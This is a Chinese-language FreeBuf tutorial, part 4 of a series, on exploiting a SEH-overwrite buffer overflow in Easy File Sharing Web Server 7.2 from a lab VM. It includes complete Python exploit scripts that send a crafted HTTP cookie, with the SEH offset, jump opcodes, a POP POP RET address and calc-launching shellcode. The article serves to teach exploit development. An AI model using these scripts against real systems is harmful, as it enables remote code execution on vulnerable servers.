@@ -1,0 +1,326 @@
+*** 本文作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
+![1525420743452.jpg!small](https://image.3001.net/images/20180504/1525420743452.jpg!small)
+
+## 0x01 前言
+
+ **漏洞——信息安全界最常见的词汇，在百度百科是这样描述的。**
+
+漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。
+
+本文主要介绍的是Windows软件漏洞的利用开发教程。
+
+我花了大量的时间来研究了计算机安全领域Windows漏洞利用开发，希望能和大家分享一下，能帮助到对这方面感兴趣的朋友，如有不足，还请见谅。
+
+## 0x02 准备阶段
+
+欢迎阅读本系列文章的第四部分，如果你错过了第前三部分，请点击下方传送门：
+
+> [Windows漏洞利用开发教程Part 1](http://www.freebuf.com/articles/system/166500.html)
+>
+> [Windows漏洞利用开发教程Part 2：Short
+> Jump](http://www.freebuf.com/articles/system/167959.html)
+>
+> [Windows漏洞利用开发教程Part
+> 3：Egghunter](http://www.freebuf.com/articles/system/169167.html)
+
+我们需要准备以下工具：
+
+    
+    
+    1、Windows XP SP3 32-bit系统iso镜像
+    2、Immunity Debugger-漏洞分析专用调试器
+    3、代码文本编辑器（个人喜好，我用的是notepad++）
+    4、Easy File Sharing Web Server 7.2
+    
+
+Easy File Sharing Web Server 是允许访客容易地经由浏览器上传/下载文件的文件分享系统。你可以从下面链接中下载到存在漏洞的程序。
+
+    
+    
+    https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe
+    
+
+漏洞披露地址：
+
+    
+    
+    https://www.exploit-db.com/exploits/42261/
+    
+
+在这篇文章中，我们将研究覆盖SEH漏洞，也是本系列文章第一次介绍远程代码执行，之前我们研究的都是本地溢出漏洞。在这里，我们将研究如何覆盖Windows中的结构化异常处理程序SEH从而执行任意代码。
+
+### SEH概述
+
+SEH即Windows结构化异常处理程序，Windows需要它运行的软件从发生的错误中恢复，所以它允许开发人员指定当程序遇到问题时的情况，然后处理程序运行，换句话说，Windows为开发人员提供了一种结构化的方式来处理异常。
+
+结构化异常处理（SEH）是一种用于处理硬件和软件异常的Windows机制，熟悉编程的人可能熟悉异常处理结构。它通常表示为try/except和try/catch代码块。
+
+C/C++（以下代码来自微软MSDN）：
+
+    
+    
+    __try {
+    // the block of code to try (aka the "guarded body")
+    ...
+    }
+    __except (exception filter) {
+    // the code to run in the event of an exception (aka the "exception handler)
+    ...
+    }
+    
+
+这个概念非常简单，尝试执行一段代码，如果发生错误或异常，即执行except块（又名异常处理程序），异常处理程序只不过是告诉系统在发生异常时该怎么做的另一个代码块。
+
+## 0x03 漏洞利用开发分析
+
+了解完SEH概念，我们将存在漏洞的程序在虚拟机中安装。
+
+![152542075936.png!small](https://image.3001.net/images/20180504/152542075936.png!small)
+
+在Immunity Debugger中打开，然后点击运行。  
+
+![15254207685042.png!small](https://image.3001.net/images/20180504/15254207685042.png!small)
+
+会出现一个注册对话框，我们点击Try it!
+
+![15254207732818.png!small](https://image.3001.net/images/20180504/15254207732818.png!small)
+
+### 确认漏洞
+
+我们需要通过快速验证脚本来确认该漏洞。 阅读下面的Python脚本:
+
+    
+    
+    # -*- coding: UTF-8 -*-    import socket
+    import os
+    import time
+    import sys
+    # 目标IP地址
+    host = "192.168.17.134"
+    # 端口
+    port = 80
+    # 建立缓冲区
+    buf = "/.:/"        # 不常见，但必须
+    buf += "A" * 3000    # 测试字符串
+    # 定制HTTP GET请求
+    request = "GET /vfolder.ghp HTTP/1.1\r\n"
+    request += "Host: " + host + "\r\n"
+    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36" + "\r\n"
+    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" + "\r\n"
+    request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
+    request += "Accept-Encoding: gzip, deflate" + "\r\n"
+    request += "Referer: " + "http://" + host + "/" + "\r\n"
+    request += "frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201; UserID=PassWD=" + buf + "; SESSIONID=27263" # 插入payload
+    request += "\r\n"
+    request += "Connection: keep-alive" + "\r\n"
+    request += "If-Modified-Since: Fri, 04 May 2018 05:07:19 GMT" + "\r\n"
+    print "[*] Connecting to target: " + host
+    # 设置socket连接
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # 连接
+    connect = s.connect((host, port))
+    # 发送payload
+    s.send(request + "\r\n\r\n")
+    # 关闭socket
+    s.close()
+    
+
+HTTP GET请求：
+
+![15254207804189.png!small](https://image.3001.net/images/20180504/15254207804189.png!small)
+
+我们上面的脚本是将3000个A字符放入HTTP GET请求的cookie部分，然后将其发送到Easy File Sharing Web Server。
+它无法正确解析GET请求，导致缓冲区溢出并造成服务器崩溃。
+
+运行脚本，程序会发生中断，你应该看到的是EAX寄存器中熟悉的0x41414141。你可以在菜单选择View->SEH
+chain，你会发现它已经被覆盖！这意味着我们可以控制部分SEH链。
+
+![15254207854475.png!small](https://image.3001.net/images/20180504/15254207854475.png!small)
+
+### SEH offset
+
+现在我们需要找到SEH的偏移量来控制SEH chain，我们可以使用mona命令。
+
+生成3000个测试字符
+
+    
+    
+    !mona pattern_create 3000
+    
+
+运行完在C:\logs\fsws\pattern.txt中找到。
+
+![15254207912797.png!small](https://image.3001.net/images/20180504/15254207912797.png!small)
+
+重启程序，将其加入到脚本中的buf中运行
+
+使用Mona命令来寻找SEH偏移量
+
+    
+    
+    !mona findmsp
+    
+
+查看Mona的控制台输出，找到它描述SEH偏移量的部分，从图中可以知道53字节可以覆盖到SEH
+
+![15254207965427.png!small](https://image.3001.net/images/20180504/15254207965427.png!small)
+
+现在我们需要一些东西来覆盖它。为了使SEH覆盖漏洞起作用，我们需要有几个字节的汇编操作码指令，这些指令将跳转到我们的shellcode以及带有POP POP
+RET的代码段的地址，为了执行这些指令，操作码指令将被放置在下一个SEH部分，并且POP POP RET指针将被放入SEH部分。
+
+### 获取操作码指令和POP POP RET地址
+
+要获得操作码指令，我们可以参考x86程序集（0xEB）中JMP使用的操作码，然后将20转换为十六进制（0x14）以获取我们将跳转的字节数。我们还会在指令中添加0x90。整个操作码如下所示：
+
+    
+    
+    eb 14 90 90
+    
+
+接下来我们需要找到那个POP POP RET代码块地址。要找到它，可以使用Mona命令：
+
+    
+    
+    !mona seh
+    
+
+打开seh.txt日志查找指向POP POP
+RET序列的代码块地址。理想情况下，我们需要一个驻留在应用程序本身文件中的代码段。这将使得漏洞利用更加便携，并且减少对个人Windows操作系统的依赖。
+
+![15254208028032.png!small](https://image.3001.net/images/20180504/15254208028032.png!small)
+
+现在我们使用模拟的INT shellcode来测试一下。
+
+### 模拟测试
+
+    
+    
+    # -*- coding: UTF-8 -*-    import socket
+    import os
+    import time
+    import sys
+    # 目标IP地址
+    host = "192.168.17.134"
+    # 端口
+    port = 80
+    # 建立缓冲区
+    padding = "/.:/"        # 不常见，但必须
+    padding += "A" * 53        # SEH偏移
+    nseh = "\xeb\x14\x90\x90"    #nseh覆盖->jmp 20个字节还有2个nop
+    seh = "\x58\x88\x01\x10"    #覆盖seh
+    nops = "\x90"*20    # 20字节nop,确保跳转成功落地
+    # shellcode
+    shellcode = "\xCC" * 32 
+    # 构建exploit
+    exploit = padding
+    exploit += nseh
+    exploit += seh
+    exploit += nops
+    exploit += shellcode
+    fill = "\x43" * (3000-len(exploit)) #确保崩溃溢出发生
+    payload = exploit + fill   
+    # 定制HTTP GET请求
+    request = "GET /vfolder.ghp HTTP/1.1\r\n"
+    request += "Host: " + host + "\r\n"
+    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36" + "\r\n"
+    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" + "\r\n"
+    request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
+    request += "Accept-Encoding: gzip, deflate" + "\r\n"
+    request += "Referer: " + "http://" + host + "/" + "\r\n"
+    request += "frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201; UserID=PassWD=" + payload + "; SESSIONID=27263" # 插入payload
+    request += "\r\n"
+    request += "Connection: keep-alive" + "\r\n"
+    request += "If-Modified-Since: Fri, 04 May 2018 05:07:19 GMT" + "\r\n"
+    print "[*] Connecting to target: " + host
+    # 设置socket连接
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # 连接
+    connect = s.connect((host, port))
+    # 发送payload
+    s.send(request + "\r\n\r\n")
+    # 关闭socket
+    s.close()
+    
+
+现在我们来解释一下脚本中的几个关键变量：
+
+nseh：代表“下一个SEH”，它通常指向链中的下一个处理程序，但我们用在x86程序集中jmp 0x20的操作码覆盖它。
+
+seh：指向发生错误时运行的代码段，我们用指向POP POP RET代码块的地址覆盖它，以便我们可以执行驻留在上一个SEH中的跳转代码。
+
+漏洞利用的关键在于自定义的SEH和跳转操作码，我们使用指向POP POP
+RET的地址覆盖下一个SEH指针，这会从堆栈帧中弹出两条指令并返回到我们的跳转操作码，导致我们添加的shellcode代码被执行。
+
+使用Immunity Debugger运行程序，然后运行我们的脚本，当然程序会暂停，使用shift+F9，你可以看见shellcode得到执行。
+
+![15254208098246.png!small](https://image.3001.net/images/20180504/15254208098246.png!small)
+
+## 0x04 漏洞利用开发
+
+经过上面的分析，现在整个开发就很简单了，只需要将shellcode修改一下就好了，我们来更新一下python脚本，放入打开计算器的shellcode。
+
+    
+    
+    # -*- coding: UTF-8 -*-    import socket
+    import os
+    import time
+    import sys
+    # 目标IP地址
+    host = "192.168.17.134"
+    # 端口
+    port = 80
+    # 建立缓冲区
+    padding = "/.:/"        # 不常见，但必须
+    padding += "A" * 53        # SEH偏移
+    nseh = "\xeb\x14\x90\x90"    #nseh覆盖->jmp 20个字节还有2个nop
+    seh = "\x58\x88\x01\x10"    #覆盖seh
+    nops = "\x90"*20    # 20字节nop,确保跳转成功落地
+    # 计算器shellcode
+    shellcode = "\x31\xC9"# xor ecx,ecx
+    shellcode += "\x51"              # push ecx
+    shellcode += "\x68\x63\x61\x6C\x63"# push 0x636c6163
+    shellcode += "\x54"# push dword ptr esp
+    shellcode += "\xB8\x0D\x25\x86\x7C"# mov eax,0x7c86250D
+    shellcode += "\xFF\xD0"# call eax
+    # 构建exploit
+    exploit = padding
+    exploit += nseh
+    exploit += seh
+    exploit += nops
+    exploit += shellcode
+    fill = "\x43" * (3000-len(exploit)) #确保崩溃溢出发生
+    payload = exploit + fill   
+    # 定制HTTP GET请求
+    request = "GET /vfolder.ghp HTTP/1.1\r\n"
+    request += "Host: " + host + "\r\n"
+    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36" + "\r\n"
+    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" + "\r\n"
+    request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
+    request += "Accept-Encoding: gzip, deflate" + "\r\n"
+    request += "Referer: " + "http://" + host + "/" + "\r\n"
+    request += "frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201; UserID=PassWD=" + payload + "; SESSIONID=27263" # 插入payload
+    request += "\r\n"
+    request += "Connection: keep-alive" + "\r\n"
+    request += "If-Modified-Since: Fri, 04 May 2018 05:07:19 GMT" + "\r\n"
+    print "[*] Connecting to target: " + host
+    # 设置socket连接
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # 连接
+    connect = s.connect((host, port))
+    # 发送payload
+    s.send(request + "\r\n\r\n")
+    # 关闭socket
+    s.close()
+    
+
+这里为了体现远程代码执行，我并没有在目标机上运行脚本，只是运行了存在漏洞的软件。在另一个计算机我们运行脚本后，目标机器成功弹出计算器。
+
+![1525420817170.png!small](https://image.3001.net/images/20180504/1525420817170.png!small)
+
+## 0x05 总结
+
+软件有时候会引入一些功能，表面上看来这些功能很正常，也确实方便了，但是经过仔细分析，这些功能可能就会变成攻击媒介。从中学习我发现操作系统确实很有趣，当然，我自认为自己了解还是太少了。还是那句话，本人水平有限，如有不足，还请各位兄弟指出。
+
+ *** 本文作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
